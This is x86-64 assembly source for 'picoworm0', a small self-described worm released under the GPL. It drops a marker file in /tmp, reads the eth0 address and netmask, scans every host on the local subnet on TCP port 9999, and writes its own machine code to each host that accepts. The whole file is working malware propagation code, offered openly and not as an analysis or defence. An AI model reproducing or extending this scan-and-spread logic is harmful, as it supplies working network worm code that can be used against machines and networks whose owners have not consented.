;;; 
;;;  *  picoworm0. Basic Worm without vulnerable service scaning
;;;  *  Copyright (c) 2023 pico (@0x00pico at twitter)
;;;  *
;;;  *  This program is free software: you can redistribute it and/or modify
;;;  *  it under the terms of the GNU General Public License as published by
;;;  *  the Free Software Foundation, either version 3 of the License, or
;;;  *  (at your option) any later version.
;;;  *  This program is distributed in the hope that it will be useful,
;;;  *  but WITHOUT ANY WARRANTY; without even the implied warranty of
;;;  *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
;;;  *  GNU General Public License for more details.
;;;  *  You should have received a copy of the GNU General Public License
;;;  *  along with this program.  If not, see <http://www.gnu.org/licenses/>.


BITS 64
section .text
global _start
_start:
	lea  	rdi, [rel mark]
	mov  	rsi, 100o | 200o 	; O_CREAT | O_EXCL
	mov  	rdx, 700o		; S_IRWXU
	call 	_open
	test 	rax,rax
	jl   	pw_done		; On error (file already exists finish)
	mov  	rdi, rax		
	call 	_close	        ; Done with payload
	
	;; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Get IP Address and mask and calculate base address for scan
	;; iface name is 16 bytes
	;; return union is 24 (addr)
	;; Create socket
	;; s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
	mov  	rdi, 2		; PF_INET 2
	mov  	rsi, 1		; SOCK_STREAM
	mov  	rdx, 6          ; IPPROTO_TCP
	call 	_socket
	mov  	rdi, rax
	
	mov  	rax, 0x000030687465
	mov  	[rbp - 0x40], rax       ; ifr.ifr_name
	mov  	BYTE [rbp - 0x30], 2    ; ifr.ifr_addr.sa_family
	mov  	rsi, 0x8915	        ; SIOCGIFADDR
	lea  	rdx, [rbp-0x40]         ; Results in the stack
	call 	_ioctl
	mov  	r12d, [rbp - 0x30 + 4]  ; Store IP Address
	
	mov  	rsi, 0x891b	        ; SIOCGIFNETWORK
	call 	_ioctl
	call 	_close                  ; Close the socket used for ioctl
	
	;; Line below just reads the IP in the lower part of r13
	mov  	r13d, [rbp - 0x30 + 4]	; Stores Netmask
	and  	r12d, r13d         	; r12 contains the network address
	mov  	ax, 0x0f27
	mov  	[rbp - 0x30 + 2], ax    ; Set port
	
	;; Calculate number of host to scan
	bswap 	r13d
	not   	r13d
		
	;; During testing just finish program here and check we get right info
	;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
	;; Do the scan
	bswap 	r12d            ; Keep network address in host representation
	                        ; so we can just add number to increase IP
	xor   	r9, r9		; IP Table counter
scan:
	;; Skip network and broadcast addresses
	cmp 	r9b, 0xff
	je  	error
	cmp 	r9b, 0
	je 	error
	
	;; Create socket
	;; s = socket (PF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6);
	mov 	rdi, 2		; PF_INET 2
	mov 	rsi, 1		; SOCK_STREAM
	mov 	rdx, 6          ; IPPROTO_TCP
	call 	_socket
	
 	mov 	rdi, rax      	; Just use the new created socket
	
	;; Calculate IP address to try no longer from a table
	mov   	r10d, r12d
	or    	r10d, r9d
	bswap 	r10d
	; Store Target IP in memory as required by connect
	mov  	[rbp - 0x30 + 4], r10d 
	
	lea  	rsi, [rbp - 0x30]  
	mov  	rdx, 16
	call 	_connect	; RSI=s, RDI=addr RCX= addr size

	test 	eax, eax
	jl 	error
	
	;;  Otherwise move the code
	;;  RDI still contains the socket
	mov 	rsi, _start
	mov 	rdx, code_size
	call 	_write
error:
	call 	_close
	inc 	r9
	cmp 	r9, r13
	je  	pw_done
	jmp 	scan

pw_done:	
	call 	_exit
	;; End of program
_write:
	xor 	eax,eax
	inc 	eax

	jmp 	_do_syscall
_open:
	mov 	eax, 02
	jmp 	_do_syscall
	
_socket:
	;; mov rax, 41
	xor 	eax,eax
	add 	al, 41
	jmp 	_do_syscall
	
_connect:
	;; 	mov rax, 42
	xor 	eax,eax
	add 	al, 42
	jmp 	_do_syscall
	
_close:
	;; mov rax, 3
	xor 	eax,eax
	add 	al, 3
	jmp 	_do_syscall
;;; New syscalls 
_ioctl:
	;; mov rax, 16
	xor 	eax, eax
	add 	al, 16
	jmp 	_do_syscall

_exit:
	xor 	eax,eax
	add 	al, 60
	;;  	mov rax, 60
	;; 	jmp _do_syscall

_do_syscall:
	syscall
	ret

worm_data:	
	mark    db "/tmp/pw",0

code_size equ $ - $$
